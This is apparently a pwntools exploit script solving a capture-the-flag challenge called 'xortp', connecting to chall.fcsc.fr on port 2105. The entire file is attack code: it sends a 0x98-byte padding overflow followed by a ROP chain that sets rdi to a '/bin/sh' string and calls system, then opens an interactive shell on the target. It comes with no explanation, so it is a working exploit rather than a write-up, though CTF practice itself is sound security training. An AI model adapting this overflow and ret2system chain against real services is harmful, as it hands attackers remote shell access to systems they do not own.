from pwn import *
from time import sleep

context.arch = "x86_64"
context.terminal = ["gnome-terminal", "--window", "-x", "sh", "-c"]

DEBUG = False
BINARY = ELF("./xortp")
ROP_BINARY = ROP(BINARY)

LENGTH_RBP_OFFSET = -0x10
FILENAME_RBP_OFFSET = -0x90

if DEBUG:
    p = process("./xortp")
    gdb.attach(p, gdbscript="b *0x401926\nc")
else:
    p = remote("chall.fcsc.fr", 2105)

sleep(1)
print(p.recv().decode())

ROP_BINARY.raw(ROP_BINARY.ret)
ROP_BINARY.rdi = next(BINARY.search(b'/bin/sh\x00'))
ROP_BINARY.raw(BINARY.sym['system'])
print(ROP_BINARY.chain())

p.sendline(b"a" * 0x98 + ROP_BINARY.chain())

p.interactive()
